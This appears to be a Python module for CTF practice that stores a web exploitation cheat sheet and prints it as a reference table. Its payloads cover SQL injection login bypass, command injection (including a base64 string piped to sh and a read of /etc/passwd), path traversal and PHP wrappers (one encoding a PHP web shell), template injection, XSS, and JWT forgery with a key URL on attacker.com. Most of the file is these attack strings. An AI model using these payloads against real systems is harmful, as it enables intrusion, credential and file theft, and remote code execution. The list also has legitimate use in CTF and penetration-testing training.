from __future__ import annotations

from typing import Any

# Curated high-impact payloads aligned with GetsFlag & PicoCTF recurring patterns
WEB_CHEATSHEETS: dict[str, list[dict[str, str]]] = {
    "SQLi": [
        {"name": "Auth Bypass Basic", "payload": "' OR '1'='1"},
        {"name": "Auth Bypass Comment", "payload": "' OR 1=1-- -"},
        {"name": "Auth Bypass Admin", "payload": "admin' -- -"},
        {"name": "Union Column Probe", "payload": "' UNION SELECT NULL,NULL-- -"},
        {"name": "Union Version SQLite/MySQL", "payload": "' UNION SELECT NULL,sqlite_version()-- -"},
        {"name": "Blind Boolean True", "payload": "' AND 1=1-- -"},
        {"name": "Blind Boolean False", "payload": "' AND 1=2-- -"},
        {"name": "Time-based Sleep", "payload": "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -"},
    ],
    "Command Injection": [
        {"name": "Semicolon Pipe", "payload": "; id"},
        {"name": "Or Operator", "payload": "|| id"},
        {"name": "Command Substitution", "payload": "$(id)"},
        {"name": "Backtick Substitution", "payload": "`id`"},
        {"name": "Newline Injection", "payload": "\nid\n"},
        {"name": "Base64 Pipe Sh", "payload": "; echo aWQ= | base64 -d | sh"},
        {"name": "Space Bypass $IFS", "payload": ";cat$IFS/etc/passwd"},
    ],
    "LFI": [
        {"name": "Path Traversal Passwd", "payload": "../../../../etc/passwd"},
        {"name": "Double Dot Filter Bypass", "payload": "....//....//etc/passwd"},
        {"name": "URL Encoded Traversal", "payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
        {"name": "PHP Filter Base64", "payload": "php://filter/convert.base64-encode/resource=index.php"},
        {"name": "PHP Input Wrapper", "payload": "php://input"},
        {"name": "Data URI Wrapper", "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="},
        {"name": "Proc Self Environ", "payload": "../../../../proc/self/environ"},
    ],
    "SSTI": [
        {"name": "Universal Arithmetic Probe", "payload": "{{7*7}}"},
        {"name": "Mako / Jinja2 Variable", "payload": "${7*7}"},
        {"name": "Ruby / ERB", "payload": "<%= 7*7 %>"},
        {"name": "Jinja2 Subclasses RCE", "payload": "{{ ''.__class__.__mro__[1].__subclasses__() }}"},
        {"name": "Twig Arithmetic", "payload": "{{7*'7'}}"},
        {"name": "Smarty Arithmetic", "payload": "{7*7}"},
    ],
    "XSS": [
        {"name": "Script Tag Alert", "payload": "<script>alert(1)</script>"},
        {"name": "Img Onerror", "payload": "\"><img src=x onerror=alert(1)>"},
        {"name": "Svg Onload", "payload": "<svg/onload=alert(1)>"},
        {"name": "Body Onload", "payload": "<body onload=alert(1)>"},
        {"name": "Javascript URI", "payload": "javascript:alert(1)"},
    ],
    "JWT": [
        {"name": "Algorithm None (none)", "payload": "header: {\"alg\":\"none\",\"typ\":\"JWT\"}"},
        {"name": "Algorithm None Upper", "payload": "header: {\"alg\":\"None\",\"typ\":\"JWT\"}"},
        {"name": "Key Confusion (HMAC with Public Key)", "payload": "Sign with RSA public key using HS256"},
        {"name": "JKU Hijack", "payload": "header: {\"alg\":\"RS256\",\"jku\":\"http://attacker.com/jwks.json\"}"},
    ],
}


def get_web_cheatsheet(category: str | None = None) -> dict[str, list[dict[str, str]]]:
    """Retrieve categorized web exploitation payloads."""
    if category:
        cat = category.strip()
        for k in WEB_CHEATSHEETS:
            if k.lower() == cat.lower():
                return {k: WEB_CHEATSHEETS[k]}
        return {}
    return WEB_CHEATSHEETS


def format_cheatsheet_text(category: str | None = None) -> str:
    """Format payload cheatsheets as readable reference table."""
    data = get_web_cheatsheet(category)
    lines: list[str] = []
    for cat, items in data.items():
        lines.append(f"=== {cat} ===")
        for it in items:
            lines.append(f"  • {it['name']:<30}: {it['payload']}")
        lines.append("")
    return "\n".join(lines)
